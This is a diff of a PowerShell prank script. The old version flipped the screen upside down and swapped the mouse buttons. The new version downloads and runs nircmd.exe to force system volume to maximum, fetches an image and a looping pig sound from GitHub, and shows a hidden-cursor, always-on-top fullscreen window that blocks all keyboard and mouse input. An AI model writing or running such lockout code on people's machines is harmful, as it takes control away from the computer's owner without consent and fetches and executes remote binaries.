@@ -1,72 +1,65 @@
-$regPath = "HKCU:\Software\PrankFlip"
-if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Native {
-    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
-    public struct DEVMODE {
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
-        public ushort dmSpecVersion;
-        public ushort dmDriverVersion;
-        public ushort dmSize;
-        public ushort dmDriverExtra;
-        public uint dmFields;
-        public int dmPositionX;
-        public int dmPositionY;
-        public uint dmDisplayOrientation;
-        public uint dmDisplayFixedOutput;
-        public short dmColor;
-        public short dmDuplex;
-        public short dmYResolution;
-        public short dmTTOption;
-        public short dmCollate;
-        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
-        public ushort dmLogPixels;
-        public uint dmBitsPerPel;
-        public uint dmPelsWidth;
-        public uint dmPelsHeight;
-        public uint dmDisplayFlags;
-        public uint dmDisplayFrequency;
-        public uint dmICMMethod;
-        public uint dmICMIntent;
-        public uint dmMediaType;
-        public uint dmDitherType;
-        public uint dmReserved1;
-        public uint dmReserved2;
-        public uint dmPanningWidth;
-        public uint dmPanningHeight;
-    }
-    [DllImport("user32.dll", CharSet=CharSet.Ansi)]
-    public static extern int EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);
-    [DllImport("user32.dll", CharSet=CharSet.Ansi)]
-    public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwFlags, IntPtr lParam);
-    [DllImport("user32.dll")]
-    public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, out bool pvParam, uint fWinIni);
-    [DllImport("user32.dll")]
-    public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, bool pvParam, uint fWinIni);
+$Url = "https://github.com/halololcloud/images/blob/main/borov.jpg?raw=true"
+$Audio = "https://github.com/halololcloud/images/raw/refs/heads/main/pig.mp3"
+$VolumeLevel = 100
+
+$val = [int]([math]::Round(65535 * ($VolumeLevel / 100)))
+$tempNir = Join-Path $env:TEMP "nircmd.exe"
+if (-not (Test-Path $tempNir)) {
+    $tempZip = Join-Path $env:TEMP "nircmd.zip"
+    Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd.zip" -OutFile $tempZip -UseBasicParsing
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $env:TEMP)
+    Remove-Item $tempZip -ErrorAction SilentlyContinue
 }
-"@ -PassThru | Out-Null
-$SPI_GETMOUSEBUTTONSWAP = 0x21
-$SPI_SETMOUSEBUTTONSWAP = 0x20
-$ENUM_CURRENT_SETTINGS = -1
-$DM_DISPLAYORIENTATION = 0x00000080
-$DMDO_180 = 2
-$dev = New-Object Native+DEVMODE
-$dev.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Native+DEVMODE])
-[Native]::EnumDisplaySettings($null, $ENUM_CURRENT_SETTINGS, [ref]$dev) | Out-Null
-$origOrientation = [int]$dev.dmDisplayOrientation
-$origWidth = [int]$dev.dmPelsWidth
-$origHeight = [int]$dev.dmPelsHeight
-$origSwap = $false
-[Native]::SystemParametersInfo($SPI_GETMOUSEBUTTONSWAP,0,[ref]$origSwap,0) | Out-Null
-Set-ItemProperty -Path $regPath -Name OrigOrientation -Value $origOrientation -Force
-Set-ItemProperty -Path $regPath -Name OrigWidth -Value $origWidth -Force
-Set-ItemProperty -Path $regPath -Name OrigHeight -Value $origHeight -Force
-Set-ItemProperty -Path $regPath -Name OrigSwap -Value ([int]($origSwap -eq $true)) -Force
-$newDev = $dev
-$newDev.dmFields = $newDev.dmFields -bor $DM_DISPLAYORIENTATION
-$newDev.dmDisplayOrientation = $DMDO_180
-[Native]::ChangeDisplaySettingsEx($null, [ref]$newDev, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
-$newSwap = -not $origSwap
-[Native]::SystemParametersInfo($SPI_SETMOUSEBUTTONSWAP,0,$newSwap,0x01u) | Out-Null
+Start-Process -FilePath $tempNir -ArgumentList "setsysvolume $val" -NoNewWindow -Wait
+
+Add-Type -AssemblyName PresentationCore,PresentationFramework,WindowsBase
+$tempImg = Join-Path $env:TEMP "fullscreen_image.jpg"
+$tempAudio = Join-Path $env:TEMP "temp_audio.mp3"
+Invoke-WebRequest -Uri $Url -OutFile $tempImg -UseBasicParsing
+Invoke-WebRequest -Uri $Audio -OutFile $tempAudio -UseBasicParsing
+
+$wmp = New-Object -ComObject WMPlayer.OCX
+$media = $wmp.newMedia($tempAudio)
+$wmp.currentPlaylist.clear()
+$wmp.currentPlaylist.appendItem($media)
+$wmp.settings.setMode("loop", $true)
+$wmp.controls.play()
+
+$fs = [IO.File]::OpenRead($tempImg)
+$bi = New-Object System.Windows.Media.Imaging.BitmapImage
+$bi.BeginInit()
+$bi.StreamSource = $fs
+$bi.CacheOption = "OnLoad"
+$bi.EndInit()
+$fs.Close()
+
+$img = New-Object System.Windows.Controls.Image
+$img.Source = $bi
+$img.Stretch = "UniformToFill"
+
+$w = New-Object System.Windows.Window
+$w.WindowStyle = "None"
+$w.ResizeMode = "NoResize"
+$w.WindowState = "Maximized"
+$w.Topmost = $true
+$w.Background = [System.Windows.Media.Brushes]::Black
+$w.Content = $img
+$w.Cursor = [System.Windows.Input.Cursors]::None
+$w.ShowInTaskbar = $false
+
+$block = { param($s,$e) $e.Handled = $true }
+$w.Add_PreviewKeyDown($block)
+$w.Add_PreviewKeyUp($block)
+$w.Add_PreviewTextInput($block)
+$w.Add_PreviewMouseDown($block)
+$w.Add_PreviewMouseUp($block)
+$w.Add_PreviewMouseMove($block)
+$w.Add_PreviewMouseWheel($block)
+
+try { $w.ShowDialog() | Out-Null }
+finally {
+    $wmp.controls.stop()
+    $wmp.close()
+    Remove-Item -Path $tempImg,$tempAudio -ErrorAction SilentlyContinue
+}
